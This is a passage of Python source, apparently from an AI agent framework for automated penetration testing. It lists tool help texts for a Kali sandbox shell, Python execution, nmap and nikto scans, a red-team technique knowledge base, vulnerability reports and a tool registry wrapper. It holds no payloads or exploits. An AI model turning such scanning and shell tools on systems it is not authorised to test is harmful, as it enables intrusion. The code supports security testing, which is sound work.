    "delete_todo": "Delete todo(index).",
    "create_note": "Create a shared note. title, content (cross-agent scratchpad).",
    "list_notes": "List notes.",
    "get_note": "Get a note by id.",
    "delete_note": "Delete a note by id.",
    "list_coverage": "List coverage ledger (negative space: what was ruled out/clean).",
    "create_vulnerability_report": "Create a vulnerability report record (strix cluster).",
    "list_reports": "List report records.",
    "amend_threat_model": "Correct the shared threat model (who trusts what). Get current via notes.",
    # ---- RED-KB 存储/检索 ----
    "search_answer": "Search RED-KB answers. query, limit.",
    "search_guide": "Search RED-KB technique guides. query, limit.",
    "store_answer": "Store a verified answer into RED-KB. question, answer, tags.",
    "store_code": "Store verified code/knowledge into RED-KB.",
    "store_guide": "Store a technique guide into RED-KB.",
    "list_skills": "List available playbook skills by category.",
    "load_skill": "Load a skill's full content by name (see list_skills). Inject the technique into your reasoning.",
    # ---- 网络 ----
    "web_get_contents": "Fetch a URL's content from the web. url. Returns {status,text<=8000}. (external; needs internet)",
    # ---- 容器（Kali sandbox）----
    "terminal": "Run a command in the Kali sandbox container. cmd, container(optional, auto-injected). Returns {stdout}.",
    "exec_command": "Run a shell command (alias of terminal/bash). command, container.",
    "python": "Run a python3 snippet in the sandbox/host. code, container.",
    "nmap": "Port scan with nmap (host, fast). target, ports optional (default top-100, avoids full 1-1000).",
    "nikto": "Web scanner. url, container(auto). Runs in Kali sandbox.",
    # ---- 信号/交互/生命周期（占位，不用于实际攻击）----
    "done": "SIGNAL only: you are finishing your task (summary). Your run actually ends when your TEXT contains 'done', not this tool.",
    "finish_scan": "SIGNAL: whole scan complete + final summary (root).",
    "report_result": "SIGNAL: submit final report summary (findings are collected from DB anyway).",
    "ask": "SIGNAL: ask the user a question (interactive mode only).",
    "ask_user": "SIGNAL: ask the user a clarifying question (interactive mode only).",
    "advice": "SIGNAL: request mentor advice when stuck (returns a template nudge).",
    "subtask_list": "SIGNAL: submit a replanning list (not wired to orchestration).",
    "subtask_patch": "SIGNAL: patch the current subtask plan (not wired).",
    "list_sitemap": "SIGNAL/stub: list sitemap (not populated; crawl via http_request instead).",
}

@tool("tool_help", "Get the HOW-TO-USE for any tool by name. Call this if you are unsure how to use a tool.",
      {"type": "object", "properties": {"name": {"type": "string"}}},
      "inhouse")
async def tool_tool_help(name: str) -> Dict[str, Any]:
    t = TOOL_REGISTRY.get(name)
    if t is None:
        return {"error": f"unknown tool '{name}'", "available": list_tools()}
    return {"tool": name, "source": t.source, "description": t.description,
            "schema": t.schema, "usage": TOOL_HELP.get(name, "(no detailed usage; see description)")}

# ---------------------------------------------------------------------------
# 工具注册表导出
# ---------------------------------------------------------------------------

def get_tool(name: str) -> Optional[ToolDef]:
    return TOOL_REGISTRY.get(name)

def list_tools() -> List[str]:
    return list(TOOL_REGISTRY.keys())

def get_tools_by_source(source: str) -> List[ToolDef]:
    return [t for t in TOOL_REGISTRY.values() if t.source == source]

class AgentTools:
    """Wraps TOOL_REGISTRY for BaseAgent compatibility."""
    def __init__(self, name: str, kb=None):
        self.name = name
        self.kb = kb
        self.tools = {name: t.handler for name, t in TOOL_REGISTRY.items()}

    async def execute(self, tool_name: str, **kwargs):
        fn = self.tools.get(tool_name)
        if fn is None:
            return {"error": f"unknown tool: {tool_name}"}
        return await fn(**kwargs)
